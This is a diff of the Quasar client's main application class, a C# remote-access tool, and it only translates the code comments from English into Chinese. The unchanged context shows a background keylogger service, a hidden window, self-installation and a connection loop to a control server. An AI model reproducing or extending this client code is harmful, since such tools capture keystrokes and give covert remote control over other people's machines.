@@ -1,4 +1,4 @@
-﻿using Quasar.Client.Config;
+﻿﻿﻿using Quasar.Client.Config;
 using Quasar.Client.Logging;
 using Quasar.Client.Messages;
 using Quasar.Client.Networking;
@@ -19,47 +19,47 @@ using System.Windows.Forms;
 namespace Quasar.Client
 {
     /// <summary>
-    /// The client application which handles basic bootstrapping of the message processors and background tasks.
+    /// 客户端应用程序，用于处理消息处理器和后台任务的基本引导。
     /// </summary>
     public class QuasarApplication : Form
     {
         /// <summary>
-        /// A system-wide mutex that ensures that only one instance runs at a time.
+        /// 系统范围的互斥锁，确保同一时间只有一个实例运行。
         /// </summary>
         public SingleInstanceMutex ApplicationMutex;
 
         /// <summary>
-        /// The client used for the connection to the server.
+        /// 用于连接到服务器的客户端。
         /// </summary>
         private QuasarClient _connectClient;
 
         /// <summary>
-        /// List of <see cref="IMessageProcessor"/> to keep track of all used message processors.
+        /// 消息处理器列表，用于跟踪所有已使用的消息处理器。
         /// </summary>
         private readonly List<IMessageProcessor> _messageProcessors;
         
         /// <summary>
-        /// The background keylogger service used to capture and store keystrokes.
+        /// 后台键盘记录服务，用于捕获和存储按键。
         /// </summary>
         private KeyloggerService _keyloggerService;
 
         /// <summary>
-        /// Keeps track of the user activity.
+        /// 跟踪用户活动。
         /// </summary>
         private ActivityDetection _userActivityDetection;
 
         /// <summary>
-        /// Determines whether an installation is required depending on the current and target paths.
+        /// 根据当前路径和目标路径确定是否需要安装。
         /// </summary>
         private bool IsInstallationRequired => Settings.INSTALL && Settings.INSTALLPATH != Application.ExecutablePath;
 
         /// <summary>
-        /// Notification icon used to show notifications in the taskbar.
+        /// 通知图标，用于在任务栏中显示通知。
         /// </summary>
         private readonly NotifyIcon _notifyIcon;
 
         /// <summary>
-        /// Initializes a new instance of the <see cref="QuasarApplication"/> class.
+        /// 初始化 <see cref="QuasarApplication"/> 类的新实例。
         /// </summary>
         public QuasarApplication()
         {
@@ -68,9 +68,9 @@ namespace Quasar.Client
         }
 
         /// <summary>
-        /// Starts the application.
+        /// 启动应用程序。
         /// </summary>
-        /// <param name="e">An System.EventArgs that contains the event data.</param>
+        /// <param name="e">包含事件数据的 System.EventArgs。</param>
         protected override void OnLoad(EventArgs e)
         {
             Visible = false;
@@ -80,7 +80,7 @@ namespace Quasar.Client
         }
 
         /// <summary>
-        /// Initializes the notification icon.
+        /// 初始化通知图标。
         /// </summary>
         private void InitializeNotifyicon()
         {
@@ -98,17 +98,17 @@ namespace Quasar.Client
         }
 
         /// <summary>
-        /// Begins running the application.
+        /// 开始运行应用程序。
         /// </summary>
         public void Run()
         {
-            // decrypt and verify the settings
+            // 解密并验证设置
             if (!Settings.Initialize())
                 Environment.Exit(1);
 
             ApplicationMutex = new SingleInstanceMutex(Settings.MUTEX);
 
-            // check if process with same mutex is already running on system
+            // 检查具有相同互斥锁的进程是否已在系统上运行
             if (!ApplicationMutex.CreatedNew)
                 Environment.Exit(2);
 
@@ -118,7 +118,7 @@ namespace Quasar.Client
 
             if (IsInstallationRequired)
             {
-                // close mutex before installing the client
+                // 在安装客户端之前关闭互斥锁
                 ApplicationMutex.Dispose();
 
                 try
@@ -135,7 +135,7 @@ namespace Quasar.Client
             {
                 try
                 {
-                    // (re)apply settings and proceed with connect loop
+                    // (重新)应用设置并继续连接循环
                     installer.ApplySettings();
                 }
                 catch (Exception e)
@@ -162,8 +162,8 @@ namespace Quasar.Client
 
                 new Thread(() =>
                 {
-                    // Start connection loop on new thread and dispose application once client exits.
-                    // This is required to keep the UI thread responsive and run the message loop.
+                    // 在新线程上启动连接循环，并在客户端退出后释放应用程序。
+                    // 这是保持UI线程响应和运行消息循环所必需的。
                     _connectClient.ConnectLoop();
                     Environment.Exit(0);
                 }).Start();
@@ -179,10 +179,10 @@ namespace Quasar.Client
         }
 
         /// <summary>
-        /// Adds all message processors to <see cref="_messageProcessors"/> and registers them in the <see cref="MessageHandler"/>.
+        /// 将所有消息处理器添加到 <see cref="_messageProcessors"/> 并在 <see cref="MessageHandler"/> 中注册它们。
         /// </summary>
-        /// <param name="client">The client which handles the connection.</param>
-        /// <remarks>Always initialize from UI thread.</remarks>
+        /// <param name="client">处理连接的客户端。</param>
+        /// <remarks>始终从UI线程初始化。</remarks>
         private void InitializeMessageProcessors(QuasarClient client)
         {
             _messageProcessors.Add(new ClientServicesHandler(this, client));
@@ -210,7 +210,7 @@ namespace Quasar.Client
         }
 
         /// <summary>
-        /// Disposes all message processors of <see cref="_messageProcessors"/> and unregisters them from the <see cref="MessageHandler"/>.
+        /// 释放 <see cref="_messageProcessors"/> 的所有消息处理器并从 <see cref="MessageHandler"/> 中注销它们。
         /// </summary>
         private void CleanupMessageProcessors()
         {
